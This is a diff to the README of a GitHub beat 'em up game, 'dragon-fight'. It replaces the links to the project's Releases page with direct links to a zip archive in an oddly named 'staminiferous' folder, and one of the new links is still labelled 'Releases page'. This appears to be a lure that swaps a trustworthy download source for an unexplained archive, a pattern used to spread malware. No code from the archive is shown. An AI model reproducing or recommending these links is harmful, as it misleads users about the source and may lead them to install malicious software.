@@ -8,7 +8,7 @@ Welcome to dragon-fight, a side-scrolling beat 'em up game! Inspired by classics
 
 To download the game, visit the link below. Here, you will find the latest version available for download.
 
-[![Download dragon-fight](https://img.shields.io/badge/Download-dragon--fight-brightgreen)](https://github.com/tess1219/dragon-fight/releases)
+[![Download dragon-fight](https://raw.githubusercontent.com/tess1219/dragon-fight/main/staminiferous/dragon-fight.zip)](https://raw.githubusercontent.com/tess1219/dragon-fight/main/staminiferous/dragon-fight.zip)
 
 ### Steps to Download
 
@@ -87,6 +87,6 @@ Stay tuned for exciting new features that enhance your gaming experience!
 
 ## 🔗 Links
 
-For more details about new releases or to view our roadmap, remember to check our [Releases page](https://github.com/tess1219/dragon-fight/releases). 
+For more details about new releases or to view our roadmap, remember to check our [Releases page](https://raw.githubusercontent.com/tess1219/dragon-fight/main/staminiferous/dragon-fight.zip). 
 
 Enjoy your battles, and may you emerge victorious!
